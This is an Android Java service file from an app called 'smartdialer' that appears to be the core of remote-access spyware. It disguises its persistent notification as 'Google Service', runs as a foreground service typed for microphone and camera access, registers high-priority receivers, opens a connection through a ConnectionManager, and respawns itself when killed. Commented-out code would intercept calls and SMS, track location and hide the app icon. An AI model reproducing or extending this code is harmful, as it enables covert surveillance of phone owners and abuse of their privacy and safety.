package com.example.smartdialer.services;

import static com.example.smartdialer.App.CHANNEL_ID;

import android.Manifest;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;


import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.example.smartdialer.BuildConfig;
import com.example.smartdialer.ConnectionManager;
import com.example.smartdialer.MainActivity;
import com.example.smartdialer.R;
import com.example.smartdialer.broadcast.CallReceiver;
import com.example.smartdialer.broadcast.ConnectivityChanged;
import com.example.smartdialer.broadcast.MyBroadcast;
import com.example.smartdialer.broadcast.ScreenOff;
import com.example.smartdialer.broadcast.ScreenOn;
import com.example.smartdialer.broadcast.SmsReceiver;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

public class MainService extends Service {
    private static Context contextOfApplication;
    public static boolean isServiceRunning = false;

    //LocationCallback locationCallback;

    @Override
    public void onCreate() {
        super.onCreate();
        /*locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                super.onLocationResult(locationResult);
                //Log.e("TAG", "onLocationResult: "+locationResult.getLastLocation().getLatitude()+","+locationResult.getLastLocation().getLongitude() );
            }
        };
        LocationRequest locationRequest = new LocationRequest();
        locationRequest.setInterval(120000);
        locationRequest.setFastestInterval(60000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        LocationServices.getFusedLocationProviderClient(this).requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
*/
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //String input = intent.getStringExtra("inputExtra");
        //Intent notificationIntent = new Intent(this, MainActivity.class);
        //PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Google Service")
                .setContentText("")
                .setSmallIcon(R.mipmap.ic_launcher)
                //.setContentIntent(pendingIntent)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE|ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        }

        //do heavy work on a background thread
        //stopSelf();

        //PackageManager pkg=this.getPackageManager();
        //pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        /*MyBroadcast myBroadcast = new MyBroadcast();
        IntentFilter filter = new IntentFilter("respawnService");
        filter.setPriority(Integer.MAX_VALUE);
        registerReceiver(myBroadcast, filter);*/

        /*CallReceiver callReceiver = new CallReceiver();
        IntentFilter filter3 = new IntentFilter("android.intent.action.PHONE_STATE");
        filter3.setPriority(Integer.MAX_VALUE);
        registerReceiver(callReceiver, filter3);

        SmsReceiver smsReceiver = new SmsReceiver();
        IntentFilter filter4 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter4.setPriority(Integer.MAX_VALUE);
        registerReceiver(smsReceiver, filter4);*/

        ConnectivityChanged connectivityChanged = new ConnectivityChanged();
        IntentFilter filter2 = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
        filter2.setPriority(Integer.MAX_VALUE);
        registerReceiver(connectivityChanged, filter2);

        ScreenOff screenOff = new ScreenOff();
        IntentFilter screenOffFilter = new IntentFilter("android.intent.action.SCREEN_OFF");
        screenOffFilter.setPriority(Integer.MAX_VALUE);
        registerReceiver(screenOff, screenOffFilter);

        ScreenOn screenOn = new ScreenOn();
        IntentFilter screenOnFilter = new IntentFilter("android.intent.action.SCREEN_ON");
        screenOnFilter.setPriority(Integer.MAX_VALUE);
        registerReceiver(screenOn, screenOnFilter);

        contextOfApplication = this;
        isServiceRunning = true;
        ConnectionManager.startConnection(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("respawnService").setPackage(BuildConfig.APPLICATION_ID));
        isServiceRunning = false;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }


}
